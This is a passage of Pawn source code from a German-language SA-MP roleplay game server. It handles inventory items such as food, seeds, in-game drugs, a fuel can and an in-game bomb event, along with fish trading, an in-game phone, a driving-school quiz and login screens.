			    if(InventarValues[SpielerInventar[playerid][x][0]][iModell] >= 1 && InventarValues[SpielerInventar[playerid][x][0]][iModell] <= 46)
			    {
			        ShowPlayerDialog(playerid,DIALOG_INVENTAR,DIALOG_STYLE_LIST,"Inventar","Waffe entnehmen\nWaffe verkaufen\nWaffe zerstören","Ausführen","Abbrechen");
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 19346)
			    {
			        //Hotdog
                    SpielerInventar[playerid][x][1]--;
                    if(SpielerInventar[playerid][x][1] <= 0)
                    {
                        SpielerInventar[playerid][x][0] = -1;
			        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
						PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
                    }
                    ApplyAnimation(playerid,"FOOD","EAT_Burger",4.2,0,0,0,0,0);
                    new string[6];
                    SpielerInfo[playerid][uHunger] += 20;
                    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
                    CallLocalFunction("cmd_inventar","d",playerid);
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 16304)
			    {
			        if(hathand[playerid] == -1)
			        {
			            if(CDrogen[playerid][drogenid] == -1)
			            {
					        SendClientMessage(playerid,COLOR_GREEN,"Du hast nun Samen in der Hand, nutze /anpflanzen");
					        new string[6];
		           			SpielerInventar[playerid][x][1]--;
		                    if(SpielerInventar[playerid][x][1] <= 0)
		                    {
		                        SpielerInventar[playerid][x][0] = -1;
					        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
								PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
		                    }
		                    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
		                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
		                    CallLocalFunction("cmd_inventar","d",playerid);
		                    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
		                    hathand[playerid] = 1;
						}else{SendClientMessage(playerid,COLOR_RED,"Du kannst erst Samen aus dem Inventar nehmen wenn deine Pflanze geerntet ist!");}
					}else{
					    SendClientMessage(playerid,COLOR_RED,"Du hast bereits Samen in deiner Hand.");
					}
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1578)
			    {
			        SendClientMessage(playerid,COLOR_GREEN,"Heal +30HP");
			        new Float:dhp,str[128];
			        GetPlayerHealth(playerid,dhp);
			        GebeLeben(playerid,dhp+30);
                    format(str, sizeof(str), "%s raucht eine Tüte...", PlayerName(playerid));
					SendRadiusMessage(playerid,20.0,str,COLOR_PURPLE);
			        //ShowPlayerDialog(playerid,DIALOG_DRUGS,DIALOG_STYLE_LIST,"Drogen verwalten"
			        new string[6];
           			SpielerInventar[playerid][x][1]--;
                    if(SpielerInventar[playerid][x][1] <= 0)
                    {
                        SpielerInventar[playerid][x][0] = -1;
			        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
						PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
                    }
                    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
                    CallLocalFunction("cmd_inventar","d",playerid);
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1650)
			    {
			        new veh = GetPlayerVehicleID(playerid);
			        if(!IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug!");
			        if(Benzin[veh]+10 <= AutoDaten[GetVehicleModel(veh)-399][MaxBenzin])
			        {
				        new str[120];
	                    format(str, sizeof(str), "%s benutzt seinen Benzinkanister", PlayerName(playerid));
						SendRadiusMessage(playerid,20.0,str,COLOR_PURPLE);
						Benzin[veh] += 10;
	           			SpielerInventar[playerid][x][1]--;
	                    if(SpielerInventar[playerid][x][1] <= 0)
	                    {
	                        SpielerInventar[playerid][x][0] = -1;
				        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
							PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
	                    }
	                    new string[6];
	              		format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
	                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
	                    CallLocalFunction("cmd_inventar","d",playerid);
					}else{SendClientMessage(playerid,COLOR_RED,"Es passen keine 10 Liter mehr in den Tank!");}
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 19942)
			    {
			        if(atombreak == 0)
			        {
				        new cops = 0;
				        for(new i = 0; i < MAX_PLAYERS; i++)
						{
		 					if(IsPlayerConnected(i) && !IsPlayerNPC(i) && SpielerInfo[i][uDienst] == 1)
						    {
						        if(IstSpielerInFrak(i,1) || IstSpielerInFrak(i,2) || IstSpielerInFrak(i,15))
						        {
							        cops++;
							        if(cops == 2) break;
								}
						    }
						}
						if(cops == 2)
						{
					        SendClientMessageToAll(COLOR_BLUE,"_________________________________________________________________");
					        SendFormatMessageToAll(COLOR_WHITE,"*{2E2EFE}[STAAT-NEWS]{FFFFFF}: %s hat den Zünder der Atombombe betätigt",PlayerName(playerid));
					        SendClientMessageToAll(COLOR_WHITE,"* Bitte begebet euch sofort in den Schutzbunker (Checkpoint)!");
					        SendClientMessageToAll(COLOR_WHITE,"* {DF0101}Die Atombombe {FFFFFF}zündet in 30 Minuten!");
				         	SendClientMessageToAll(COLOR_BLUE,"_________________________________________________________________");
				         	sirenean = 1;
				         	sireneaktivbomb = 1;
	             			atombreak = 1;
	             			SetTimer("Bombewieder",1000*60*48,0);
				         	bombenspieler = playerid;
				         	for(new i = 0; i < GetMaxPlayers();i++)
				         	{
				         	    SetPlayerCheckpoint(i,1602.4631,-9232.8369,6.3278-1,6.0);
				         	    cpaktiv[i] = 1;
				         	    if(IsPlayerInRangeOfPoint(i,400,1773.2511,-9346.1758,4.4124) && playersirene[i] != 1)
				         	    {
									playersirene[i] = 1;
					            	PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",1773.2511,-9346.1758,4.4124,400.0, 1);//Lake Sorten
								}
								else if(IsPlayerInRangeOfPoint(i,100,6388.7686,-7735.3823,4.3759) && playersirene[i] != 2)
								{
								    playersirene[i] = 2;
									PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",6388.7686,-7735.3823,4.3759,400.0, 1);//Santa Felton
								}
								else if(IsPlayerInRangeOfPoint(i,100,6341.7388,-9307.4414,4.4197) && playersirene[i] != 3)
								{
								    playersirene[i] = 3;
		                            PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",6341.7388,-9307.4414,4.4197,300.0, 1);//Lake Vortex
								}
								else if(IsPlayerInRangeOfPoint(i,180,4480.4688,-8701.7871,8.1025) && playersirene[i] != 4)
								{
								    playersirene[i] = 4;
								    PlayAudioStreamForPlayer(i, "https://county-islands.com/sounds/sirene.mp3",4480.4688,-8701.7871,8.1025,400.0, 1);//Army
								}

				         	}
		                    SpielerInventar[playerid][x][1]--;
		                    if(SpielerInventar[playerid][x][1] <= 0)
		                    {
		                        SpielerInventar[playerid][x][0] = -1;
					        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
								PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
		                    }
		                    new string[6];
		                    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
		                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
		                    CallLocalFunction("cmd_inventar","d",playerid);
		                    Bombentimer5 = SetTimer("Atombombe",1000*60*30,0);
						}else SendClientMessage(playerid,COLOR_RED,"Dafür müssen mindestens 2 Cops im Dienst sein.");
					}else SendClientMessage(playerid,COLOR_RED,"Es darf nur alle 48 Stunden eine Atombombe gezündet werden!");
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 3096)
			    {
			        new online = 0;
			        for(new i = 0; i < GetMaxPlayers(); i++)
			        {
						if(SpielerInfo[i][uLeiter] == 3 && SpielerInfo[i][uDienst] == 1 || SpielerInfo[i][uMitglied] == 3 && SpielerInfo[i][uDienst] == 1 || SpielerInfo[i][uLeiter] == 4 && SpielerInfo[i][uDienst] == 1 || SpielerInfo[i][uMitglied] == 4 && SpielerInfo[i][uDienst] == 1)
						{
						    online++;
						}
			        }
			        new vehicleid = GetPlayerVehicleID(playerid);
			        new fahrzeug = 0,str[80];
			        if(online == 0)
			        {
				        for(new e = 0; e < 2; e++)
				        {
				            if(SAuto[playerid][e][sID] == vehicleid)
				            {
				                fahrzeug++;
			                    format(str, sizeof(str), "%s repariert sein Fahrzeug mit dem Fahrzeugkit!", PlayerName(playerid));
								SendRadiusMessage(playerid,20.0,str,COLOR_PURPLE);//DADADA
	                            RepairVehicle(SAuto[playerid][e][sID]);
	                            Motorschaden2[SAuto[playerid][e][sID]] = 0;
			           			SpielerInventar[playerid][x][1]--;
			                    if(SpielerInventar[playerid][x][1] <= 0)
			                    {
			                        SpielerInventar[playerid][x][0] = -1;
						        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
									PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
			                    }
			                    new string[6];
	                      		format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
			                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
			                    CallLocalFunction("cmd_inventar","d",playerid);
				            }
				        }
				        if(fahrzeug == 0)
				        {
							SendClientMessage(playerid,COLOR_RED,"Du kannst nur deine Privatfahrzeuge damit reparieren!");
				        }
					}else {SendClientMessage(playerid,COLOR_RED,"Das Repairkit funktioniert nur wenn kein Mitglied des Fire & Rescue online ist!");}
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1575)
			    {
      				SendClientMessage(playerid,COLOR_GREEN,"Armour +50HP");
			        new Float:dhp,str[128];
			        GetPlayerArmour(playerid,dhp);
			        GebeRuestung(playerid,dhp+50);
                    format(str, sizeof(str), "%s schnupft Koks....", PlayerName(playerid));
					SendRadiusMessage(playerid,20.0,str,COLOR_PURPLE);//DADADA
			        //ShowPlayerDialog(playerid,DIALOG_DRUGS,DIALOG_STYLE_LIST,"Drogen verwalten"
			        new string[6];
           			SpielerInventar[playerid][x][1]--;
                    if(SpielerInventar[playerid][x][1] <= 0)
                    {
                        SpielerInventar[playerid][x][0] = -1;
			        	PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
						PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
                    }
                    format(string,sizeof string,"%d",SpielerInventar[playerid][x][1]);
                    PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],string);
                    CallLocalFunction("cmd_inventar","d",playerid);
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1604)
			    {
			        //Illegaler Fisch
			    }
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1599)
			    {
			        //Legaler Fisch
				}
				else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 19630)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,4,6451.4619,-8141.5786,4.4018)) return SendClientMessage(playerid,COLOR_RED,"Du kannst Fische nur am Fischmarkt verkaufen!");
			        fischauswahl[playerid] = 1; CallLocalFunction("cmd_inventar","d",playerid);
			        ShowPlayerDialog(playerid,DIALOG_VERKAUFFISCH,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Heringe möchtest du verkaufen?\nPreis pro Hering 10$","Verkaufen","Abbrechen");
			        //Hering
				}
				else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 902)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,4,6451.4619,-8141.5786,4.4018)) return SendClientMessage(playerid,COLOR_RED,"Du kannst Fische nur am Fischmarkt verkaufen!");
			        ShowPlayerDialog(playerid,DIALOG_VERKAUFFISCH,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Seesterne möchtest du verkaufen?\nPreis pro Seestern 2$","Verkaufen","Abbrechen");
			        fischauswahl[playerid] = 2; CallLocalFunction("cmd_inventar","d",playerid);
			        //Seestern
				}
				else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1603)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,4,6451.4619,-8141.5786,4.4018)) return SendClientMessage(playerid,COLOR_RED,"Du kannst Fische nur am Fischmarkt verkaufen!");
			        ShowPlayerDialog(playerid,DIALOG_VERKAUFFISCH,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Quallen möchtest du verkaufen?\nPreis pro Qualle 5$","Verkaufen","Abbrechen");
			        fischauswahl[playerid] = 3; CallLocalFunction("cmd_inventar","d",playerid);
			        //Qualle
				}
				else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1609)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,4,3708.2046,-8905.4316,51.5022)) return SendClientMessage(playerid,COLOR_RED,"Dieses Tier kann man nur am Schwarzmarkt verkaufen/eintauschen!");
			        ShowPlayerDialog(playerid,DIALOG_FISCHSM2,DIALOG_STYLE_LIST,"Fisch verkauf","Schildkröten eintauschen gegen Koks\nSchildkröte verkaufen","Verkaufen","Abbrechen");
			        fischauswahl[playerid] = 4; CallLocalFunction("cmd_inventar","d",playerid);
			        //Schildkröte
				}
				else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1607)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,4,3708.2046,-8905.4316,51.5022)) return SendClientMessage(playerid,COLOR_RED,"Dieses Tier kann man nur am Schwarzmarkt verkaufen/eintauschen!");
			        ShowPlayerDialog(playerid,DIALOG_FISCHSM,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Delfine möchtest du verkaufen? ( 200$ pro Hai )","Verkaufen","Abbrechen");
			        fischauswahl[playerid] = 5; CallLocalFunction("cmd_inventar","d",playerid);
			        //delfin
				}
				else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 1608)
			    {
			        if(!IsPlayerInRangeOfPoint(playerid,4,3708.2046,-8905.4316,51.5022)) return SendClientMessage(playerid,COLOR_RED,"Dieses Tier kann man nur am Schwarzmarkt verkaufen/eintauschen!");
			        fischauswahl[playerid] = 6; CallLocalFunction("cmd_inventar","d",playerid);
			        ShowPlayerDialog(playerid,DIALOG_FISCHSM,DIALOG_STYLE_INPUT,"Fisch verkauf","Wie viele Haie möchtest du verkaufen? ( 150$ pro Hai )","Verkaufen","Abbrechen");
			        //Hai
				}
			    else if(InventarValues[SpielerInventar[playerid][x][0]][iModell] == 18632)
			    {
			        SetPlayerAttachedObject(playerid,9,18632,6,0.074000,0.029999,0.079999,0.000000,180.000000,0.000000,1.000000,1.000000,1.000000);
			        SpielerInventar[playerid][x][0] = -1;
			        SpielerInventar[playerid][x][1] = 0;
			        PlayerTextDrawSetPreviewModel(playerid,SpielerInventarText[playerid][x+7], -1);
			        PlayerTextDrawHide(playerid,SpielerInventarText[playerid][x+7]);
					PlayerTextDrawSetString(playerid,SpielerInventarText[playerid][x+22],"0");
					SendClientMessage(playerid,COLOR_GREEN,"Mit /angel kannst du die Angel wieder wegpacken!");
			        //Angelrute
			    }
				break;
			}
		}
		if(playertextid == SpielerInventarText[playerid][37])
		{
			InventarShow[playerid] = 0; CancelSelectTextDraw(playerid);
			for(new e = 0; e < sizeof(SpielerInventarText[]); e++) PlayerTextDrawHide(playerid, SpielerInventarText[playerid][e]);
			for(new t = 0; t < 38; t++)
			{
			    PlayerTextDrawDestroy(playerid, SpielerInventarText[playerid][t]);
			}
		}
	}
	for(new x = 12; x < sizeof(MoebelKauf[]); x++)
	{
	    if(playertextid == MoebelKauf[playerid][x])
	    {
	        new string[10];
	        PlayerTextDrawSetString(playerid,MoebelKauf[playerid][7],MoebelhausListe[x-12]);
			MoebelKategorie[playerid] = x-12;
			PlayerTextDrawHide(playerid,MoebelKauf[playerid][6]);
   			PlayerTextDrawSetPreviewModel(playerid,MoebelKauf[playerid][6],MoebelStueck[MoebelKategorie[playerid]][0][0]);
	    	PlayerTextDrawSetPreviewRot(playerid,MoebelKauf[playerid][6], 0.0, 0.0, 140.0, 1.0);
		    PlayerTextDrawShow(playerid,MoebelKauf[playerid][6]);
			format(string,sizeof string,"%d",MoebelStueck[MoebelKategorie[playerid]][0][1]);
			PlayerTextDrawSetString(playerid, MoebelKauf[playerid][8],string);
			CancelSelectTextDraw(playerid);
			break;
	    }
 	}
 	for(new x = 12; x < 21; x++)
 	{
 	    if(playertextid == Handy[playerid][x])
 	    {
 	        if(strlen(NummerCall[playerid]) < 7)
	 		{
	   			format(NummerCall[playerid],8,"%s%d",NummerCall[playerid],x-11);
	   			PlayerTextDrawSetString(playerid,Handy[playerid][11],NummerCall[playerid]);
 			}
 	        break;
 	    }
 	}
 	if(playertextid == Handy[playerid][22])//Taste 0
  	{
  		if(strlen(NummerCall[playerid]) < 7)
 		{
   			format(NummerCall[playerid],8,"%s0",NummerCall[playerid]);
   			PlayerTextDrawSetString(playerid,Handy[playerid][11],NummerCall[playerid]);
		}
   	}
   	else if(playertextid == Handy[playerid][26])
  	{
  	    new string[50];
  	    for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(Handycall[i] == playerid)
		    {
		        if(Handycall[playerid] == -1)
		        {
			        SendClientMessage(playerid,COLOR_GREEN,"Anruf angenommen!");
			        Handycall[playerid] = i;
			        SendClientMessage(i,COLOR_GREEN,"Es wurde abgehoben!");
					return 1;
				}else
				{
                    SendClientMessage(playerid,COLOR_RED,"Du bist bereits am Telefon!");
				}
		    }
		}
		if(Handycall[playerid] != -1) return SendClientMessage(playerid,COLOR_RED,"Du telefonierst bereits oder rufst jemanden an!");
  	    for(new i = 0; i < MAX_PLAYERS; i++)
  	    {
  	        if(SpielerInfo[i][uHandynummer] == strval(NummerCall[playerid]) && SpielerInfo[i][uEingeloggt] == 1)
  	        {
  	            if(Handycall[i] != -1) return SendClientMessage(playerid,COLOR_RED,"Nummer besetzt!");
  	            format(string,sizeof string,"Du wirst von Nummer %d angerufen.",SpielerInfo[playerid][uHandynummer]);
  	            PlayerTextDrawSetString(i,Handy[i][11],"_Anruf");
  	            PlayerTextDrawSetString(playerid,Handy[playerid][11],"_Anruf");
				Handycall[playerid] = i;
				SetTimerEx("CallEnd",20000,0,"d",playerid);
  	            SendClientMessage(i,COLOR_GREEN,string);
  	            format(string,sizeof string,"Du rufst die Nummer %s an. Es klingelt...",NummerCall[playerid]);
  	            SendClientMessage(playerid,COLOR_GREEN,string);
  	            return 1;
  	        }
  	    }
  	    SendClientMessage(playerid,COLOR_RED,"Kein Anschluss unter dieser Nummer!");
  	}
  	else if(playertextid == Handy[playerid][25])
  	{
  	    //Auflegen
  	    format(NummerCall[playerid],sizeof NummerCall[]," ");
  	    PlayerTextDrawSetString(playerid,Handy[playerid][11],NummerCall[playerid]);
  	    if(Handycall[Handycall[playerid]] == playerid)
		{
	  	    SendClientMessage(playerid,COLOR_GREEN,"Aufgelegt!");
	   	    SendClientMessage(Handycall[playerid],COLOR_GREEN,"Dein Gesprächspartner hat aufgelegt!");
	   	    PlayerTextDrawSetString(Handycall[playerid],Handy[Handycall[playerid]][11],"_");
	   	    PlayerTextDrawSetString(playerid,Handy[playerid][11],"_");
	   	    format(NummerCall[Handycall[playerid]],sizeof NummerCall[]," ");
		    Handycall[Handycall[playerid]] = -1;
		}
		Handycall[playerid] = -1;
  	}
	if(playertextid == FahrschuleTheo[playerid][1])
 	{
 	    new string[20];
  		format(string,sizeof string,"%s",FahrschulTheoretisch[FahrschulPruef[playerid]][Richtig]);
		if(strfind(FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1],string, true) != -1)
		{
		    FahrschulPruef[playerid]++;
  			if(FahrschulPruef[playerid] == sizeof(FahrschulTheoretisch))
	    	{
  				FahrschulPruef[playerid] = -1;
	    		PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][0]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][1]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][2]);
			   	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][3]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][4]);
				PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][5]);
				if(FahrschulPruef_Fehler[playerid] <= 2)
    			{
					GameTextForPlayer(playerid,"~g~Theoretischen Teil bestanden!",2000,4);
					SpielerInfo[playerid][uTheorie] = 1;
				}
				else
				{
    				GameTextForPlayer(playerid,"~r~Theoretischen Teil nicht bestanden, zu viele Fehler!",2000,4);
				}
				FahrschulPruef_Fehler[playerid] = 0;
				TogglePlayerControllable(playerid,true);
   				CancelSelectTextDraw(playerid);
	    	}
		    else
		    {
			    PlayerPlaySound(playerid,21002,0,0,0);
			    PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
			}
		}
		else
		{
  			PlayerPlaySound(playerid,21001,0,0,0);
  			FahrschulPruef[playerid]++;
	    	PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
			FahrschulPruef_Fehler[playerid]++;
		}
    }
    else if(playertextid == FahrschuleTheo[playerid][2])
 	{
 	    new string[20];
  		format(string,sizeof string,"%s",FahrschulTheoretisch[FahrschulPruef[playerid]][Richtig]);
		if(strfind(FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2],string, true) != -1)
		{
		    FahrschulPruef[playerid]++;
  			if(FahrschulPruef[playerid] == sizeof(FahrschulTheoretisch))
	    	{
  				FahrschulPruef[playerid] = -1;
	    		PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][0]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][1]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][2]);
			   	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][3]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][4]);
				PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][5]);
				if(FahrschulPruef_Fehler[playerid] <= 2)
    			{
					GameTextForPlayer(playerid,"~g~Theoretischen Teil bestanden!",2000,4);
					SpielerInfo[playerid][uTheorie] = 1;
				}
				else
				{
    				GameTextForPlayer(playerid,"~r~Theoretischen Teil nicht bestanden, zu viele Fehler!",2000,4);
				}
				FahrschulPruef_Fehler[playerid] = 0;
				TogglePlayerControllable(playerid,true);
   				CancelSelectTextDraw(playerid);
	    	}
		    else
		    {
			    PlayerPlaySound(playerid,21002,0,0,0);
			    PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
			}
		}
		else
		{
  			PlayerPlaySound(playerid,21001,0,0,0);
  			FahrschulPruef[playerid]++;
	    	PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
			FahrschulPruef_Fehler[playerid]++;
		}
    }
    else if(playertextid == FahrschuleTheo[playerid][3])
 	{
 	    new string[20];
  		format(string,sizeof string,"%s",FahrschulTheoretisch[FahrschulPruef[playerid]][Richtig]);
		if(strfind(FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3],string, true) != -1)
		{
		    FahrschulPruef[playerid]++;
  			if(FahrschulPruef[playerid] == sizeof(FahrschulTheoretisch))
	    	{
  				FahrschulPruef[playerid] = -1;
	    		PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][0]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][1]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][2]);
			   	PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][3]);
			    PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][4]);
				PlayerTextDrawHide(playerid,FahrschuleTheo[playerid][5]);
				if(FahrschulPruef_Fehler[playerid] <= 2)
    			{
					GameTextForPlayer(playerid,"~g~Theoretischen Teil bestanden!",2000,4);
					SpielerInfo[playerid][uTheorie] = 1;
				}
				else
				{
    				GameTextForPlayer(playerid,"~r~Theoretischen Teil nicht bestanden, zu viele Fehler!",2000,4);
				}
				FahrschulPruef_Fehler[playerid] = 0;
				TogglePlayerControllable(playerid,true);
   				CancelSelectTextDraw(playerid);
	    	}
		    else
		    {
			    PlayerPlaySound(playerid,21002,0,0,0);
			    PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
				PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
			}
		}
		else
		{
  			PlayerPlaySound(playerid,21001,0,0,0);
  			FahrschulPruef[playerid]++;
	    	PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][0],FahrschulTheoretisch[FahrschulPruef[playerid]][Frage]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][1],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort1]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][2],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort2]);
			PlayerTextDrawSetString(playerid,FahrschuleTheo[playerid][3],FahrschulTheoretisch[FahrschulPruef[playerid]][Antwort3]);
			FahrschulPruef_Fehler[playerid]++;
		}
    }
	return 1;
}
forward khani(playerid);
public khani(playerid)
{
    ApplyAnimation(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0);
	return 1;
}
forward CallEnd(playerid);
public CallEnd(playerid)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(Handycall[i] == playerid) return 1;
	}
	SendClientMessage(playerid,COLOR_RED,"Anruf beendet, keine Antwort!");
	PlayerTextDrawSetString(playerid,Handy[playerid][11],"_");
	Handycall[playerid] = -1;
	return 1;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
    if(SpielerInfo[playerid][uAFK] != 300) SpielerInfo[playerid][uAFK] = 0;
	new string[256];
	if(clickedid == LoginDraw[9])
	{
	    ShowPlayerDialog(playerid,Login,DIALOG_STYLE_PASSWORD,"Einloggen","Logge dich mit deinem Passwort ein:","Login","");
	}

	else if(clickedid == RegisterDraw[9])
	{
	    ShowPlayerDialog(playerid,Registrieren,DIALOG_STYLE_INPUT,"{C30000}Registrierung auf County Islands","{FEFEFE}Es wurde kein Account mit deinem Namen gefunden.\n\nRegistriere dich jetzt mit einem sicherem Passwort:","Registrieren","Abbrechen");
	}
	else if(clickedid == RegisterDraw[12] || clickedid == LoginDraw[12])
	{
	    SendClientMessage(playerid,COLOR_RED,"Es gibt noch keine Informationen!");
	}
	if(clickedid == county_map[34])
	{
		for(new i = 0; i < 37; i++){TextDrawHideForPlayer(playerid,county_map[i]);}
		CancelSelectTextDraw(playerid);KillTimer(ci_map_blinkTM[playerid]);PlayerTextDrawHide(playerid,county_map_pl[playerid]);
		ci_map_blink[playerid]=false;ci_map_state[playerid] =false;
		ErstellenHunger(playerid);
		GeldAnzeigepl(playerid);
		WantedAnzeige(playerid);
		if(IsPlayerInAnyVehicle(playerid))
		{
			for(new x = 0; x < sizeof(TachoText[]); x++) PlayerTextDrawShow(playerid,TachoText[playerid][x]);
		}
	}
	if(clickedid == county_map[26])//Villbeach
	{
		ci_map_selected[playerid]=1;
		ShowPlayerDialog(playerid, DIALOG_CIMAP, DIALOG_STYLE_LIST, "County Islands | Villbeach","• Makierung setzen\n• Stadtplan anzeigen\n• Entfernung berechnen", "Weiter", "Zurück");
	}
	if(clickedid == county_map[27])//Portland
	{
		ci_map_selected[playerid]=2;
